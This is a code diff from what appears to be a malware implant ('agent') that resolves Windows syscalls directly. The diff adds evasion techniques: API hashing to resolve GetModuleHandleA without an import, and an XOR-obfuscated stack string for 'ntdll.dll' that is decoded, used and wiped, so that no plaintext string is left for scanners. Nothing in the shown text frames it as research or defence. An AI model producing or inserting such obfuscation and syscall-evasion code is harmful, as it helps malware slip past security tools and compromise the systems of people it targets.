@@ -8,6 +8,7 @@
  */
 #include "agent.h"
 #include "syscalls.h"
+#include "api_resolve.h"
 
 /* ─── Global syscall table ─── */
 SYSCALL_TABLE g_SyscallTable = {0};
@@ -129,7 +130,18 @@ int syscall_resolve(DWORD nameHash, SYSCALL_ENTRY *entry) {
     entry->ssn = 0;
     entry->pSyscallAddr = NULL;
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    /* Resolve ntdll base via PEB walk — no plaintext string */
+    typedef HMODULE (WINAPI *pGetModuleHandleA_t)(LPCSTR);
+    pGetModuleHandleA_t fnGMH = (pGetModuleHandleA_t)api_resolve(HASH_KERNEL32, HASH_GetModuleHandleA);
+    HMODULE hNtdll = NULL;
+    if (fnGMH) {
+        /* We need to pass "ntdll.dll" — decrypt on stack */
+        char ntdll_s[] = { 'n'^0x5A, 't'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A,
+                           '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0 };
+        for (int _k = 0; ntdll_s[_k]; _k++) ntdll_s[_k] ^= 0x5A;
+        hNtdll = fnGMH(ntdll_s);
+        SecureZeroMemory(ntdll_s, sizeof(ntdll_s));
+    }
     if (!hNtdll) return SYSCALL_ERR_NO_NTDLL;
 
     /* Parse PE export directory */
